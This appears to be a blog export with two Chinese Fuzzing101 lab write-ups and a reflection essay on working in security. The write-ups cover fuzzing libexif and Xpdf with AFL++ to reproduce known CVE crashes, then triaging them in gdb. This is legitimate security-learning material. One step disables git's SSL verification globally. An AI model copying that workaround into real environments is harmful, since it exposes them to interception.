    <url>/2023/07/19/Exercise2/</url>
    
    <content type="html"><![CDATA[<h2 id="Exercise2-libexif"><a href="#Exercise2-libexif" class="headerlink" title="Exercise2 libexif"></a>Exercise2 libexif</h2><h3 id="任务目标："><a href="#任务目标：" class="headerlink" title="任务目标："></a>任务目标：</h3><p>对libexif EXIF解析库进行模糊测试，目标是在 libexif 0.6.14 中找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2009-3895">CVE-2009-3895</a> （一种基于堆的缓冲区溢出）的崩溃&#x2F;PoC 和 <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2836">CVE-2012-2836</a> （越界读取漏洞）的另一个崩溃。</p><h3 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h3><p><strong>下载并解压libexif</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/libexif/</span>libexif<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/tags/</span>libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br>tar -xzvf libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br></code></pre></td></tr></table></figure><p>libexif是一个开源的用于处理Exchangeable Image File Format (EXIF) 数据的C语言库，提供了一组功能强大的API，用于读取、写入和操作EXIF数据。</p><p><strong>安装libexif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release/<br>sudo apt-<span class="hljs-built_in">get</span> install autopoint libtool gettext libpopt-dev<br>autoreconf -fvi<br>./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p><code>autoreconf</code> 是一个用于自动重建 Autotools 构建系统的工具，该命令通常用于在源代码目录中运行 Autotools 工具链，以重新生成配置脚本 <code>configure</code>、构建规则 <code>Makefile.in</code> 和其他相关文件。这样可以确保配置和构建系统与当前环境和依赖项保持同步。</p><p><strong>安装EXIF</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz<br>tar -xzvf exif-0_6_15-release.tar.gz<br><br><span class="hljs-built_in">cd</span> exif-exif-0_6_15-release/<br>autoreconf -fvi<br>./configure --enable-shared=no --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> PKG_CONFIG_PATH=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>由于libexif是一个库，是一组功能的集合而本身不是一个独立的执行文件，因此需要安装使用这个库的一个应用程序来进行模糊测试。使用库的程序通常会验证输入数据的有效性和合法性。模糊测试工具可能生成具有不同格式的输入，包括不合法的输入。使用该库的程序可以验证并解析这些输入。</p><p><strong>验证安装</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/i</span>nstall<span class="hljs-regexp">/bin/</span>exif<br></code></pre></td></tr></table></figure><p><strong>获取样本</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ianare/</span>exif-samples<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/heads/m</span>aster.zip<br>unzip master.zip<br></code></pre></td></tr></table></figure><p><strong>使用alf-clang-lto编译libexif和exif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rm -r <span class="hljs-variable">$HOME</span>/fuzzing_libexif/install<br>cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/libexif-libexif-0_6_14-release/<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/exif-exif-0_6_15-release<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>afl-clang-lto 是 AFL的一个定制版本，它使用了 Link Time Optimization（LTO）技术。LTO 可以在链接时优化代码，包括在不同编译单元之间进行全局的代码优化。通过使用 afl-clang-lto 编译，可以提高模糊测试的代码覆盖率，因为优化的代码更有可能探索到更多路径和分支。同时相比于afl-clang，afl-clang-lto具有更好的性能。</p><p><strong>进行模糊测试</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>exif-samples-master<span class="hljs-regexp">/jpg/</span> -o <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>out<span class="hljs-regexp">/ -s 123 -- $HOME/</span>fuzzing_libexif<span class="hljs-regexp">/install/</span>bin/exif @@<br></code></pre></td></tr></table></figure><p>得到如下输出</p><p><img src="/2023/07/19/Exercise2/image-20230721171848925.png" alt="image-20230721171848925"></p><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>编译出带调试信息的可执行文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br> <br>cd exif-exif-0_6_15-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>通过GDB跑出crash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args .<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/exif ./</span>out<span class="hljs-regexp">/default/</span>crashes/&lt;your filename&gt;<br></code></pre></td></tr></table></figure><p><strong>crash1</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111050543.png" alt="image-20230722111050543"></p><p>与Exercise1一样，报错为SIGSEGV，Segmentation fault，存在内存泄漏，根据报错信息可以看出为地址无法访问</p><p><strong>crash2</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111516258.png" alt="image-20230722111516258"></p><p>错误信息：存在内存泄漏</p><p>错误位置：..&#x2F;sysdeps&#x2F;x86_64&#x2F;multiarch&#x2F;memmove-vec-unaligned-erms.S</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>官方修复方案：</p><ul><li><a href="https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361">https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361</a></li><li><a href="https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06">https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101-Exercise1</title>
    <link href="/2023/07/09/Exercise1/"/>
    <url>/2023/07/09/Exercise1/</url>
    
    <content type="html"><![CDATA[<h2 id="Fuzzing-101"><a href="#Fuzzing-101" class="headerlink" title="Fuzzing 101"></a>Fuzzing 101</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p>实验目的：安装Xpdf，安装AFL工具并了解如何使用</p><p>创建目录并安装基本工具包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-built_in">cd</span> fuzzing_xpdf/<br>sudo apt install build-essential<br></code></pre></td></tr></table></figure><p>下载，解压Xpdf，并完成安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">wget https://<span class="hljs-keyword">dl</span>.xpdfreader.<span class="hljs-keyword">com</span>/old/xpdf-<span class="hljs-number">3.02</span>.tar.gz<br>tar -xvzf xpdf-<span class="hljs-number">3.02</span>.tar.gz<br><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>测试Xpdf，可以下载测试样例或者自己造一个pdf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br><span class="hljs-built_in">mkdir</span> pdf_examples &amp;&amp; <span class="hljs-built_in">cd</span> pdf_examples<br>wget http://www.africau.edu/images/default/sample.pdf<br></code></pre></td></tr></table></figure><p>通过命令 <code>$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code>  可以得到如下输出</p><p><img src="/2023/07/09/Exercise1/image-20230708231306619.png" alt="image-20230708231306619"></p><p><code>$HOME/fuzzing_xpdf/install/bin/pdfinfo</code> 指定的要执行的程序路径，<code>-box -meta</code> 是向pdfinfo程序传递的选项和参数，-box 表示显示文档的页面框线，-meta显示文档的元数据信息</p><p><code>$HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code> 指定的是要操作的pdf文件</p><p><img src="/2023/07/09/Exercise1/image-20230708231459280.png" alt="image-20230708231459280"></p><p>在pdfinfo的目录下还有如下程序：</p><ul><li>pdffonts：用于显示 PDF 文件中使用的字体信息，包括字体名称、类型、嵌入状态等</li><li>pdfimages：用于从 PDF 文件中提取图像。它可以将 PDF 文件中的图像提取为独立的图像文件</li><li>pdftops：用于将 PDF 文件转换为 PostScript 格式。PostScript 是一种页面描述语言，可以在打印机或其他设备上进行渲染和打印</li><li>pdftotext：用于将 PDF 文件中的文本提取为纯文本格式</li></ul><p>接下来安装AFL++</p><p>第一条安装命令用于安装构建软件包（<code>build-essential</code>）、Python 3 开发库（<code>python3-dev</code>）、自动构建工具（<code>automake</code>）、版本控制工具 Git（<code>git</code>）、词法分析器生成器 Flex（<code>flex</code>）、语法分析器生成器 Bison（<code>bison</code>）、GLib 开发库（<code>libglib2.0-dev</code>）、像素管理库 Pixman 开发库（<code>libpixman-1-dev</code>）以及 Python 3 的 setuptools。</p><p>第二条安装命令用于安装 LLVM 和 Clang </p><p>第三条安装命令根据系统上已安装的 GCC 版本，安装相应的插件开发包和 libstdc++ 开发库</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-dev<br></code></pre></td></tr></table></figure><p>接着安装AFL++工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br>make distrib<br>sudo make install<br></code></pre></td></tr></table></figure><p>此处遇到一个报错：</p><p><img src="/2023/07/09/Exercise1/image-20230709105123404.png" alt="image-20230709105123404"></p><p>可以通过禁用SSL证书解决，但会降低安全性，需要在可靠的网络环境中操作</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install gnutls-bin<br>git<span class="hljs-built_in"> config </span>--global http.sslVerify <span class="hljs-literal">false</span><br>git<span class="hljs-built_in"> config </span>--global http.postBuffer 1048576000<br></code></pre></td></tr></table></figure><p>至此AFL安装完成，可以输入 <code>afl-fuzz</code>得到如下输出</p><p><img src="/2023/07/09/Exercise1/image-20230709151638679.png" alt="image-20230709151638679"></p><p>通过命令，可以对pdftotext进行测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></table></figure><p>该命令使用 AFL 工具对 pdftotext 程序进行模糊测试。它从指定的输入文件夹中获取测试样本，将 AFL 输出结果保存到out中。使用随机数种子 123，测试 pdftotext 程序，并将程序的输出结果保存到output中</p><p>等待程序运行可以得到如下结果，红色的为发现的崩溃</p><p><img src="/2023/07/09/Exercise1/image-20230709215359532.png" alt="image-20230709215359532"></p><p>运行命令，<code>-g</code> 选项用于在编译过程中生成调试符号信息，而 <code>-O0</code> 选项则指示编译器禁用优化。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">make clean<br><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> ./configure --prefix<span class="hljs-operator">=</span><span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>运行gdb，此处的your filename应该填写crashes文件夹中的，包含报错信息的文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>out<span class="hljs-regexp">/default/</span>crashes<span class="hljs-regexp">/&lt;your filename&gt; $HOME/</span>fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><p>输入run或者r来运行，可以得到错误信息，程序收到了SIGSEGV信号，也称为分段错误（Segmentation fault）。这种错误通常是由于访问无效的内存地址导致的。</p><p><img src="/2023/07/09/Exercise1/image-20230716150720853.png" alt="image-20230716150720853"></p><p>通过bt命令进行回溯，可以看到反复进行了getobj和makestream的调用</p><p><img src="/2023/07/09/Exercise1/image-20230716153423406.png" alt="image-20230716153423406"></p><p>下载官方修复了该问题的Xpdf4.02发现，与此版本相比，添加了一个记录循环次数的变量，解决该问题</p><p>旧：</p><p><img src="/2023/07/09/Exercise1/image-20230716153759316.png" alt="image-20230716153759316"></p><p>新：</p><p><img src="/2023/07/09/Exercise1/image-20230716154017601.png" alt="image-20230716154017601"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>此次实验了解了模糊测试器功能，通过种子的变异和组合不断对pdftotext这个程序进行测试。同时也熟悉了gdb的相关操作以及提升了一定的程序流分析能力。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>读后感：So you want to work in security?</title>
    <link href="/2023/07/07/ReflectionPeper/"/>
    <url>/2023/07/07/ReflectionPeper/</url>
    
    <content type="html"><![CDATA[<h2 id="读后感：So-you-want-to-work-in-security"><a href="#读后感：So-you-want-to-work-in-security" class="headerlink" title="读后感：So you want to work in security?"></a>读后感：So you want to work in security?</h2><p><a href="http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html">So you want to work in security?</a></p><h3 id="得忙起来"><a href="#得忙起来" class="headerlink" title="得忙起来"></a>得忙起来</h3><p>对于这篇博客，我更愿意将其视作一个纠正我暑期，或是说毕业之后的一个较为松懈的学习态度以及开学前以何种学习方式去补充自己的不足的一篇文章。</p><p>显然，本科毕业确实给我带来了一些可能与我并不相称的快乐，即其实我算是选择大于努力的那一部分人，在考研过程中我并未付出和其他人那般的努力，所以其实更应该看到自己与别人的差距，让我快要生锈的脑子转起来。</p><h3 id="任重道远"><a href="#任重道远" class="headerlink" title="任重道远"></a>任重道远</h3><p>安全方向所涉及的知识面的广度，在我浅薄的认知里，我认为是大于其他方向的。这一点其实早期在蓝鲸短暂学习的时候就感受过了。而其实这也是我在文中感觉被狠狠打脸的一部分。“<strong>Don’t give up when you encounter things you don’t understand</strong>”文中如是说，其实原来我很有幸的扛过了蓝鲸筛选的第一阶段，但随着难度上升，我逃避了。很戏谑的，某学长就在交流中问过：“这回学不学的下去”。我认为这一点确实也是我需要去克服的。</p><p>同时，文中写到要充分利用资源，对于这一点，我认为应该是充分的利用有效资源，或者说是如何高效的利用资源处理亟待解决的问题。其实无论从本科的学习还是说之前的毕设或者是论文分享，都可以看出，查找学习知识是一个类似于剥洋葱的过程，查找A中发现有B不懂，那么再去找B，学习B是发现其中出现的C，D不清楚，那么就应该先去把C，D看懂，再一层层往上反着推，无疑这会消耗大量时间，但总归是要比一知半解的了解A是什么会来的更有收获。</p><h3 id="保持思考"><a href="#保持思考" class="headerlink" title="保持思考"></a>保持思考</h3><p>这一点不仅是说是，如何去提出问题，也是面对一个问题时你能怎么去解决。安全方面，解决问题需要灵活性，可能本科期间，多数时间我们都在跟着课本学习所谓的标准答案，也就是文中提到的“If you prefer to follow a pre-set curriculum, you’re not going to get very far in security”跟着预定的课程走。我确实不否认我更乐意去按着安排做事儿，答案跟着标准答案走，但我觉着确实也应该做出一些突破了。</p>]]></content>
    
    
    <categories>
      
      <category>Something interesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>read</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
